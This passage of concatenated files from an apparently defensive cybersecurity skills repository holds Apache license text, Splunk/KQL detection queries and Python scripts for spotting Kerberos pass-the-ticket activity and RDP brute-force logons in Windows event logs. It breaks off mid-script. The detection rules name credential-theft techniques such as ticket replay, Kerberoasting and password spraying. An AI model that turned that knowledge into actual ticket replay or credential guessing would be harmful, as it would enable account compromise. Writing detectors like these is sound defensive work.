      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-pass-the-ticket-attacks/references/api-reference.md =====
# Pass-the-Ticket Detection API Reference

## Windows Security Event IDs

### Event ID 4768 - TGT Requested
```
Key Fields:
  TargetUserName      - Account requesting TGT
  TargetDomainName    - Domain of account
  IpAddress           - Source IP of request
  TicketEncryptionType - 0x12 (AES256), 0x17 (RC4-HMAC)
  PreAuthType         - 15 (PA-ENC-TIMESTAMP)
```

### Event ID 4769 - TGS Requested
```
Key Fields:
  TargetUserName      - Account using the ticket
  ServiceName         - SPN of requested service
  IpAddress           - Source IP
  TicketEncryptionType - 0x17 indicates RC4 downgrade
  TicketOptions       - Kerberos ticket flags
```

### Event ID 4771 - Kerberos Pre-Authentication Failed
```
Key Fields:
  TargetUserName      - Account that failed
  IpAddress           - Source of failure
  Status              - 0x18 (wrong password), 0x12 (expired)
```

## Splunk SPL Queries

### RC4 Encryption Downgrade Detection
```spl
index=wineventlog sourcetype="WinEventLog:Security" EventCode=4769
  TicketEncryptionType=0x17
| stats count by TargetUserName, IpAddress, ServiceName
| where count > 3
```

### Cross-Host Ticket Reuse
```spl
index=wineventlog EventCode=4769
| stats dc(IpAddress) as ip_count, values(IpAddress) as ips
  by TargetUserName
| where ip_count > 1
| sort -ip_count
```

### TGS Volume Anomaly
```spl
index=wineventlog EventCode=4769
| bin _time span=1h
| stats count by TargetUserName, _time
| eventstats avg(count) as avg_count, stdev(count) as sd by TargetUserName
| where count > avg_count + (3 * sd)
```

## Elastic / KQL Queries

### RC4 Downgrade in Elastic
```kql
event.code: "4769" AND winlog.event_data.TicketEncryptionType: "0x17"
```

### Cross-Host Reuse in Elastic
```json
POST security-*/_search
{
  "size": 0,
  "query": { "term": { "event.code": "4769" } },
  "aggs": {
    "by_user": {
      "terms": { "field": "winlog.event_data.TargetUserName" },
      "aggs": {
        "unique_ips": { "cardinality": { "field": "source.ip" } }
      }
    }
  }
}
```

## MITRE ATT&CK Mapping

| Technique | ID | Detection |
|---|---|---|
| Use Alternate Authentication Material: Pass the Ticket | T1550.003 | RC4 downgrade, cross-host reuse |
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 | High TGS volume for SPNs |
| Brute Force: Password Spraying | T1110.003 | Pre-auth failure spikes |

## CLI Usage

```bash
# Parse exported event log XML and detect PtT indicators
python agent.py --evtx-xml security_events.xml --output report.json

# Show Splunk detection queries
python agent.py --show-splunk

# Custom thresholds
python agent.py --evtx-xml events.xml --tgs-threshold 30 --preauth-threshold 5
```

===== END FILE =====


===== FILE: skills/detecting-pass-the-ticket-attacks/scripts/agent.py =====
#!/usr/bin/env python3
"""Detect Kerberos Pass-the-Ticket attacks via Windows Event ID 4768/4769/4771 analysis."""

import json
import argparse
import xml.etree.ElementTree as ET
from collections import defaultdict
from datetime import datetime


def parse_evtx_xml(xml_path):
    """Parse exported Windows Security event log XML for Kerberos events."""
    tree = ET.parse(xml_path)
    root = tree.getroot()
    ns = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}
    events = []
    for event_el in root.findall(".//e:Event", ns):
        sys_el = event_el.find("e:System", ns)
        event_id = int(sys_el.find("e:EventID", ns).text)
        if event_id not in (4768, 4769, 4771):
            continue
        time_created = sys_el.find("e:TimeCreated", ns).attrib.get("SystemTime", "")
        data_el = event_el.find("e:EventData", ns)
        fields = {}
        for d in data_el.findall("e:Data", ns):
            fields[d.attrib.get("Name", "")] = d.text or ""
        events.append({
            "event_id": event_id,
            "timestamp": time_created,
            "target_user": fields.get("TargetUserName", ""),
            "target_domain": fields.get("TargetDomainName", ""),
            "ip_address": fields.get("IpAddress", ""),
            "service_name": fields.get("ServiceName", ""),
            "ticket_encryption_type": fields.get("TicketEncryptionType", ""),
            "status": fields.get("Status", ""),
            "pre_auth_type": fields.get("PreAuthType", ""),
        })
    return events


def detect_rc4_downgrade(events):
    """Detect RC4 encryption downgrade (TicketEncryptionType 0x17) in TGS requests."""
    alerts = []
    for ev in events:
        enc_type = ev["ticket_encryption_type"]
        if enc_type in ("0x17", "23"):
            alerts.append({
                "detection": "RC4 Encryption Downgrade",
                "mitre_technique": "T1550.003",
                "event_id": ev["event_id"],
                "timestamp": ev["timestamp"],
                "user": ev["target_user"],
                "domain": ev["target_domain"],
                "service": ev["service_name"],
                "ip_address": ev["ip_address"],
                "encryption_type": enc_type,
                "severity": "high",
                "description": "RC4 (0x17) ticket encryption detected; may indicate Pass-the-Ticket or Kerberoasting",
            })
    return alerts


def detect_cross_host_ticket_reuse(events):
    """Detect same user TGS requests from multiple source IPs within short window."""
    user_ips = defaultdict(set)
    user_events = defaultdict(list)
    for ev in events:
        if ev["event_id"] == 4769 and ev["target_user"] and ev["ip_address"]:
            key = f"{ev['target_user']}@{ev['target_domain']}"
            user_ips[key].add(ev["ip_address"])
            user_events[key].append(ev)
    alerts = []
    for user, ips in user_ips.items():
        if len(ips) >= 2:
            sample = user_events[user][:5]
            alerts.append({
                "detection": "Cross-Host Ticket Reuse",
                "mitre_technique": "T1550.003",
                "user": user,
                "source_ips": list(ips),
                "ip_count": len(ips),
                "request_count": len(user_events[user]),
                "severity": "critical",
                "sample_timestamps": [e["timestamp"] for e in sample],
                "description": "Same user ticket used from multiple IPs, indicating stolen ticket replay",
            })
    return alerts


def detect_anomalous_tgs_volume(events, threshold=50):
    """Detect users requesting abnormally high number of TGS tickets."""
    user_tgs = defaultdict(int)
    for ev in events:
        if ev["event_id"] == 4769 and ev["target_user"]:
            user_tgs[f"{ev['target_user']}@{ev['target_domain']}"] += 1
    alerts = []
    for user, count in user_tgs.items():
        if count >= threshold:
            alerts.append({
                "detection": "Anomalous TGS Volume",
                "mitre_technique": "T1550.003",
                "user": user,
                "tgs_request_count": count,
                "threshold": threshold,
                "severity": "high",
                "description": f"User requested {count} service tickets (threshold: {threshold})",
            })
    return alerts


def detect_preauth_failures(events, threshold=10):
    """Detect excessive Kerberos pre-authentication failures (Event ID 4771)."""
    user_failures = defaultdict(int)
    for ev in events:
        if ev["event_id"] == 4771:
            user_failures[f"{ev['target_user']}@{ev['target_domain']}"] += 1
    alerts = []
    for user, count in user_failures.items():
        if count >= threshold:
            alerts.append({
                "detection": "Excessive Pre-Auth Failures",
                "mitre_technique": "T1110.003",
                "user": user,
                "failure_count": count,
                "severity": "medium",
                "description": f"{count} Kerberos pre-authentication failures detected",
            })
    return alerts


def generate_splunk_queries():
    """Return SPL queries for Splunk-based PtT detection."""
    return {
        "rc4_downgrade": (
            'index=wineventlog sourcetype="WinEventLog:Security" EventCode=4769 '
            'TicketEncryptionType=0x17 | stats count by TargetUserName, IpAddress, ServiceName'
        ),
        "cross_host_reuse": (
            'index=wineventlog EventCode=4769 | stats dc(IpAddress) as ip_count, '
            'values(IpAddress) as source_ips by TargetUserName | where ip_count > 1'
        ),
        "tgs_volume_anomaly": (
            'index=wineventlog EventCode=4769 | stats count by TargetUserName '
            '| where count > 50 | sort -count'
        ),
        "preauth_failures": (
            'index=wineventlog EventCode=4771 | stats count by TargetUserName, IpAddress '
            '| where count > 10'
        ),
    }


def main():
    parser = argparse.ArgumentParser(description="Pass-the-Ticket Attack Detector")
    parser.add_argument("--evtx-xml", help="Path to exported Security event log XML")
    parser.add_argument("--tgs-threshold", type=int, default=50, help="TGS volume alert threshold")
    parser.add_argument("--preauth-threshold", type=int, default=10, help="Pre-auth failure threshold")
    parser.add_argument("--output", default="ptt_detection_report.json", help="Output report path")
    parser.add_argument("--show-splunk", action="store_true", help="Print Splunk SPL queries")
    args = parser.parse_args()

    if args.show_splunk:
        queries = generate_splunk_queries()
        for name, spl in queries.items():
            print(f"\n--- {name} ---\n{spl}")
        return

    if not args.evtx_xml:
        print("[!] Provide --evtx-xml path to exported Windows Security event log XML")
        print("[*] Or use --show-splunk to get Splunk detection queries")
        return

    events = parse_evtx_xml(args.evtx_xml)
    print(f"[+] Parsed {len(events)} Kerberos events (4768/4769/4771)")

    rc4_alerts = detect_rc4_downgrade(events)
    reuse_alerts = detect_cross_host_ticket_reuse(events)
    volume_alerts = detect_anomalous_tgs_volume(events, args.tgs_threshold)
    preauth_alerts = detect_preauth_failures(events, args.preauth_threshold)

    report = {
        "analysis_time": datetime.utcnow().isoformat() + "Z",
        "total_kerberos_events": len(events),
        "detections": {
            "rc4_downgrade": rc4_alerts,
            "cross_host_ticket_reuse": reuse_alerts,
            "anomalous_tgs_volume": volume_alerts,
            "preauth_failures": preauth_alerts,
        },
        "total_alerts": len(rc4_alerts) + len(reuse_alerts) + len(volume_alerts) + len(preauth_alerts),
        "mitre_techniques": ["T1550.003", "T1558.003", "T1110.003"],
        "splunk_queries": generate_splunk_queries(),
    }

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    print(f"[+] Alerts: RC4={len(rc4_alerts)}, Reuse={len(reuse_alerts)}, "
          f"Volume={len(volume_alerts)}, PreAuth={len(preauth_alerts)}")
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/detecting-rdp-brute-force-attacks/SKILL.md =====
---
name: detecting-rdp-brute-force-attacks
description: Detect RDP brute force attacks by parsing Windows Security Event Logs
  (EVTX files, via python-evtx) for failed logon patterns (Event ID 4625, Logon
  Type 10/3), correlating with successful logons (Event ID 4624), and analyzing
  NLA failures and source IP frequency. Use when investigating exposed RDP endpoints,
  building SIEM detection rules for credential guessing, or confirming whether
  a compromised account followed a brute-force pattern.
domain: cybersecurity
subdomain: threat-detection
tags:
- threat-detection
- rdp
- brute-force
- windows-event-logs
- blue-team
- siem
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- DE.AE-02
- DE.AE-06
- ID.RA-05
mitre_attack:
- T1021.001
- T1110.001
- T1110.003
- T1078
---
# Detecting RDP Brute Force Attacks

## Overview

RDP brute force attacks target Windows Remote Desktop Protocol services by attempting rapid credential guessing against exposed RDP endpoints. Detection relies on analyzing Windows Security Event Logs for Event ID 4625 (failed logon with Logon Type 10 or 3) and correlating with Event ID 4624 (successful logon) to identify compromised accounts. This skill covers parsing EVTX files with python-evtx, identifying attack patterns through source IP frequency analysis, detecting NLA bypass attempts, and generating actionable detection reports.


## When to Use

- When investigating security incidents that require detecting rdp brute force attacks
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Python 3.9+ with `python-evtx`, `lxml` libraries
- Windows Security EVTX log files (exported from Event Viewer or collected via WEF)
- Understanding of Windows authentication Event IDs (4624, 4625, 4776)
- Familiarity with RDP Logon Types (Type 3 for NLA, Type 10 for RemoteInteractive)

## Steps

### Step 1: Export Security Event Logs
Export Windows Security logs to EVTX format using Event Viewer or wevtutil:
```
wevtutil epl Security C:\logs\security.evtx
```

### Step 2: Parse Failed Logon Events
Use python-evtx to parse Event ID 4625 entries, extracting source IP, target username, failure reason (Sub Status), and Logon Type fields.

### Step 3: Analyze Attack Patterns
Identify brute force patterns by:
- Counting failed logons per source IP within time windows
- Detecting username spray attacks (many usernames from one IP)
- Correlating 4625 failures with subsequent 4624 success from same IP

### Step 4: Generate Detection Report
Produce a JSON report with top attacking IPs, targeted accounts, time-based analysis, and compromise indicators.

## Expected Output

JSON report containing:
- Total failed logon events and unique source IPs
- Top attacking IPs ranked by failure count
- Targeted usernames and failure sub-status codes
- Successful logons following brute force attempts (potential compromises)
- Time-series analysis of attack intensity

===== END FILE =====


===== FILE: skills/detecting-rdp-brute-force-attacks/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-rdp-brute-force-attacks/references/api-reference.md =====
# API Reference: Detecting RDP Brute Force Attacks

## Windows Security Event IDs

| Event ID | Description | Key Fields |
|----------|-------------|------------|
| 4625 | Failed logon attempt | TargetUserName, IpAddress, SubStatus, LogonType |
| 4624 | Successful logon | TargetUserName, IpAddress, LogonType |
| 4776 | NTLM credential validation | TargetUserName, Workstation, Status |
| 4771 | Kerberos pre-auth failed | TargetUserName, IpAddress, Status |

## Logon Types for RDP

| Type | Name | Context |
|------|------|---------|
| 3 | Network | RDP with NLA enabled (pre-auth) |
| 10 | RemoteInteractive | RDP session after NLA |

## Failure Sub-Status Codes

| Sub-Status | Meaning |
|------------|---------|
| 0xC0000064 | User does not exist |
| 0xC000006A | Wrong password |
| 0xC0000234 | Account locked out |
| 0xC0000072 | Account disabled |
| 0xC0000193 | Account expired |
| 0xC0000071 | Password expired |

## python-evtx Library Usage

```python
import Evtx.Evtx as evtx

with evtx.Evtx("Security.evtx") as log:
    for record in log.records():
        xml_str = record.xml()
```

Install: `pip install python-evtx lxml`

## wevtutil Export Commands

```bash
# Export Security log to EVTX
wevtutil epl Security C:\logs\security.evtx

# Query failed RDP logons
wevtutil qe Security /q:"*[System[(EventID=4625)] and EventData[Data[@Name='LogonType']='10']]" /f:text

# Count recent failed logons
wevtutil qe Security /q:"*[System[(EventID=4625)]]" /c:100 /rd:true /f:text
```

## Detection Thresholds

| Pattern | Threshold | Indicator |
|---------|-----------|-----------|
| Brute force | >10 failures/IP in 15 min | Single-target credential guessing |
| Password spray | >5 unique users/IP | Multi-user single-password attack |
| Compromise | 4625 followed by 4624 from same IP | Successful brute force |

## References

- Microsoft Event 4625: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625
- Microsoft Event 4624: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624
- python-evtx: https://github.com/williballenthin/python-evtx
- LogonTracer: https://github.com/JPCERTCC/LogonTracer

===== END FILE =====


===== FILE: skills/detecting-rdp-brute-force-attacks/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for detecting RDP brute force attacks from Windows Event Logs.

Parses EVTX files for Event ID 4625 (failed logon) and 4624
(successful logon) to identify brute force patterns, source IP
frequency, username spraying, and post-compromise indicators.
"""
# For authorized security monitoring and blue team use only

import argparse
import json
import os
import xml.etree.ElementTree as ET
from collections import Counter, defaultdict
from datetime import datetime
from pathlib import Path

try:
    import Evtx.Evtx as evtx
except ImportError:
    evtx = None

NS = "{http://schemas.microsoft.com/win/2004/08/events/event}"
FAILURE_SUBSTATUS = {
    "0xc0000064": "user_does_not_exist",
    "0xc000006a": "wrong_password",
    "0xc0000072": "account_disabled",
    "0xc000006f": "logon_outside_hours",
    "0xc0000070": "workstation_restriction",
    "0xc0000071": "password_expired",
    "0xc0000234": "account_locked",
    "0xc0000193": "account_expired",
}
RDP_LOGON_TYPES = {"3", "10"}


def _extract_event_data(xml_str):
    """Extract structured fields from a single EVTX record XML."""
    root = ET.fromstring(xml_str)
    sys_node = root.find(f"{NS}System")
    event_id = sys_node.find(f"{NS}EventID").text if sys_node is not None else None
    time_created = None
    tc = sys_node.find(f"{NS}TimeCreated") if sys_node is not None else None
    if tc is not None:
        time_created = tc.get("SystemTime", "")

    data = {}
    for d in root.iter(f"{NS}Data"):
        name = d.get("Name", "")
        data[name] = d.text or ""
    return event_id, time_created, data


class RDPBruteForceDetector:
    """Detects RDP brute force attacks from Windows Security EVTX logs."""

    def __init__(self, evtx_path, threshold=10, time_window_minutes=15,
                 output_dir="./rdp_brute_force_report"):
        self.evtx_path = evtx_path
        self.threshold = threshold
        self.time_window = time_window_minutes
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.failed_logons = []
        self.successful_logons = []

    def parse_events(self):
        """Parse EVTX file and extract logon events."""
        if evtx is None:
            raise RuntimeError("python-evtx not installed: pip install python-evtx")
        with evtx.Evtx(self.evtx_path) as log:
            for record in log.records():
                try:
                    xml_str = record.xml()
                except Exception:
                    continue
                event_id, ts, data = _extract_event_data(xml_str)
                logon_type = data.get("LogonType", "")
                if event_id == "4625" and logon_type in RDP_LOGON_TYPES:
                    self.failed_logons.append({
                        "timestamp": ts,
                        "source_ip": data.get("IpAddress", "-"),
                        "target_user": data.get("TargetUserName", ""),
                        "target_domain": data.get("TargetDomainName", ""),
                        "sub_status": data.get("SubStatus", "").lower(),
                        "logon_type": logon_type,
                    })
                elif event_id == "4624" and logon_type in RDP_LOGON_TYPES:
                    self.successful_logons.append({
                        "timestamp": ts,
                        "source_ip": data.get("IpAddress", "-"),
                        "target_user": data.get("TargetUserName", ""),
                        "logon_type": logon_type,
                    })

    def analyze(self):
        """Analyze parsed events for brute force patterns."""
        ip_counter = Counter(e["source_ip"] for e in self.failed_logons)
        user_counter = Counter(e["target_user"] for e in self.failed_logons)
        substatus_counter = Counter(
